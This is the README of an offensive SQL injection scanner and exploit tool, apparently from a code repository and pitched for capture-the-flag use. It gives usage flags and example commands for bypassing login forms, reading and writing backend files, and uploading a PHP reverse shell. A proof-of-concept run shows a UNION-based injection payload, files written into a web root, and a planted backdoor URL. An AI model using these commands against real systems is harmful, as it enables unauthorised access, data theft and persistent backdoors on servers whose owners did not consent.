# sql_injection
A sql injection scan and exploit script

This script can be used if you can't use sqlmap, or for any restriction like wih some ctfs.

It scan if a parameter is injectable , and also find how to exploit it.

## Functions:

##### . Scan
##### . Bypass an blind authentication Form with return message (true,false)
##### . Found an injection
##### . Read a file from the DBMS
##### . Write a file into the DBMS
##### . Upload a reverse shell into the DBMS 


## Use

```
usage: sql_injection [-h] --data DATA [-m METHOD] [--file-dest REMOTEPAH]
                     [--file-write LOCALPATH] [--file-read PATHTOREAD]
                     [--upload-revshell REVSHELLPATH] [-H HEADER] [-c COOKIES]
                     -u URL -p PARAMETER [-ns BYPASS] [-s FOUND] [-l LEVEL]
                     [-v VERBOSE]

A sql injection scan and exploit script

optional arguments:
  -h, --help            show this help message and exit
  --data DATA           Data string to be sent through POST/GET Like
                        "category=2&productId=1&productName=name"
  -m METHOD, --method METHOD
                        Htp method to use for injection, set to POST by
                        default
  --file-dest REMOTEPAH
                        Back-end DBMS absolute filepath to write to
  --file-write LOCALPATH
                        Write a local file on the back-end DBMS file system
  --file-read PATHTOREAD
                        Read a local file on the back-end DBMS file system
  --upload-revshell REVSHELLPATH
                        Upload a rev shell in the host. The script verify if
                        rev-shell is accessible from outside
  -H HEADER             One or multiple header for the request, separate with
                        a space Use like 'key1:value1 key2:value2'
  -c COOKIES, --cookies COOKIES
                        One or multiple cookies values for the request,
                        separate with a space Use like 'PHPSESSID=shuv7rnuv
                        UserToken=yes'
  -u URL, --url URL     The url to use for sqli
  -p PARAMETER, --parameter PARAMETER
                        The injectable parameter
  -ns BYPASS, --not-string BYPASS
                        Define the failed login message. Script try sqli until
                        this string is not in the request output
  -s FOUND, --string FOUND
                        Define the successfully login message. Script try sqli
                        until the string is in the request output
  -l LEVEL, --level LEVEL
                        The level of the scan (l|h) "l" for little, and "h"
                        for huge
  -v VERBOSE, --verbose VERBOSE
                        Define verbose output. set to False by default
```

## Examples

#### Bypass a form authetication returning a text when false

```
$ sql_injection -u http://host/index.php --data "username=admin&password=admin" -p username -ns "Your Login Name or Password is invalid" -v 1
```

#### Bypass a form authetication returning a text when true

```
$ sql_injection -u http://host/index.php --data "username=admin&password=admin" -p username -s "Success" -v 1
```

#### Found an injection

```
$ sql_injection -u http://host/view_product.php -H "Agent:roughiz" --data "productId=1" -p productId 
```

#### Read a file from the DBMS

```
$ sql_injection -u http://host/view_product.php -H "Agent:roughiz" --data "productId=1" -p productId   --file-read "C:/Inetpub/wwwroot/view_product.php"
```

#### Write a file into the DBMS

```
$ sql_injection -u http://host/view_product.php -H "Agent:roughiz" --data "productId=1" -p productId   --file-write /tmp/output.txt --file-dest "/InetPub/wwwroot/test.txt"
```

#### Upload a reverse shell into the DBMS 

```
$ sql_injection -u http://10.10.10.10:8080/complain/view.php -m GET -H "Agent:roughiz" --data "mod=admin&view=repod&id=plans" -p id  --cookie "PHPSESSID=9cc97jn016e2naklhp4rnj64j0"  --upload-revshell shell_cmd.php  -v 1
```

## Poc

```
$ sql_injection -u http://box/view_product.php -H "X-Forwarded-For:192.168.1.2 Agent:roughiz" --data "productId=1" -p productId  --file-write test.txt --file-dest "C:/Inetpub/wwwroot/uploads/test.txt" --file-read "/Inetpub/wwwroot/cx3iSfa2OwsY.php"  --upload-revshell ./shell_cmd.php

[SQLI] The parameter "productId" is injectable
[SQLI] Blind injection use code error to analyse injection
[Exploit] Found a sqli injection: -8408 UNION ALL SELECT CONCAT(0x716a6b6a54,0x57795a66454142,0x5562626b71)#
[Exploit] The Head: (-8408 UNION ALL SELECT  ) and the comment char: (#)
[Upload] Upload a file through sqli
Do you want confirmation that the file 'test.txt' has been successfully written on the backend file system ('C:/Inetpub/wwwroot/uploads/test.txt')?. 'No' by default: [y/n] y
[Upload] File has been successfully written on the backend 
[Upload] File verification: the local file "test.txt" and the remote file "C:/Inetpub/wwwroot/uploads/test.txt" have the same size (74 B)
[Read] The file "/Inetpub/wwwroot/cx3iSfa2OwsY.php" exists and it has the size (74 B)
[Read] File readed successfully, it will be saved at he path: "/tmp/lJ6iu9Kp__Inetpub_wwwroot_cx3iSfa2OwsY.php" 
[Reverse Shell Upload] Upload a reverse shell file through sqli
[INFO] Going to use a web backdoor to establish the tunnel
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
>  
[Reverse Shell Upload] Define destination directory path
what do you want to use for writable directory?
[1] Define a locations(s) path(s)
[2] Brute force search (default)
> 2
[Reverse Shell Upload] Define the DBMS server architecture
Choose the DBMS architecture?
[1] Windows
[2] Linux
[3] All (default)
> 1
[Reverse Shell Upload] The script found 1 url(s)
[URL] Try your reverse shell in the url: http://box/adbVypBUZZ9n.php uploaded in the DBMS path "/Inetpub/wwwroot/adbVypBUZZ9n.php"
```

